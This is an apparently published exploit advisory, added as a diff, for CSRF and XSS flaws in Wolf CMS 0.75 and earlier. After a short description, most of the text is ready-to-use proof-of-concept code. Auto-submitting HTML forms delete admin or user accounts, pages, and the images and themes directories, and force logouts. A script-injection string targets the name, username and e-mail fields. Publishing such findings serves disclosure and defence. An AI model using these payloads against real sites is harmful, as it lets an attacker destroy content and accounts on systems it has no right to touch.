@@ -1,0 +1,80 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title    : Wolfcms <= 0.75 Multiple Vulnerabilities (CSRF - XSS) 
+# Date             : 22-03-2012
+# Author           : Ivano Binetti (http://www.ivanobinetti.com)
+# Software link    : http://wolfcms.googlecode.com/files/wolfcms_075.zip
+# Vendor site      : http://www.wolfcms.org/
+# Version          : 0.75 and lower 
+# Tested on        : Debian Squeeze (6.0) 
+# Original Advisory: http://www.webapp-security.com/2012/03/wolfcms/
++--------------------------------------------------------------------------------------------------------------------------------+
+Summary
+1)Introduction
+2)Vulnerabilities Description
+3)Exploit
+ 3.1 CSRF - Delete Admin/User
+ 3.2 CSRF - Delete Pages
+ 3.3 CSRF - Delete "images" directory
+ 3.4 CSRF - Delete "themes" directory
+ 3.5 CSRF (Force Logout)
+ 3.6 XSS 
++--------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+Wolfcms is a "ligh-weight, fast, simple and powerful" cms.
+
+2)Vulnerabilities Description
+Wolfcms 0.75 (and lower) is prone to multiple CSRF vulnerabilities that allow to delete admin/user, delete web pages, delete 
+"images" and "themes" directory, force logout  when an authenticated admin/user browses a special crafted web page.
+This cms is also affected by XSS vulnerabilities in "wolfcms/admin/user/add" pages due to an improper input sanitization of 
+"user[name]", "user[email]" and "user[username]" parameters passed via POST http method.
+
+3)Exploit
+ 3.1 CSRF (Delete Admin/User)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/user/delete/2">
+ </form>
+ </body>
+ </html>
+
+ 3.2 CSRF (Delete Pages)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/page/delete/1">
+ </form>
+ </body>
+ </html> 
+ 
+ 3.3 CSRF - Delete "images" directory
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/plugin/file_manager/delete/images">
+ </form>
+ </body>
+ </html> 
+
+ 3.4 CSRF - Delete "themes" directory
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/plugin/file_manager/delete/themes">
+ </form>
+ </body>
+ </html>
+ 
+
+ 3.5 CSRF (Force Logout)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://<wolfcms_ip>:80/admin/login/logout">
+ </form>
+ </body>
+ </html>
+
+
+ 3.6 XSS
+ To exploit "Name" and "Username" "E-mail" fields: 
+ "><script>alert("XSS")</script> 
+
+ 
++--------------------------------------------------------------------------------------------------------------------------------+
+  
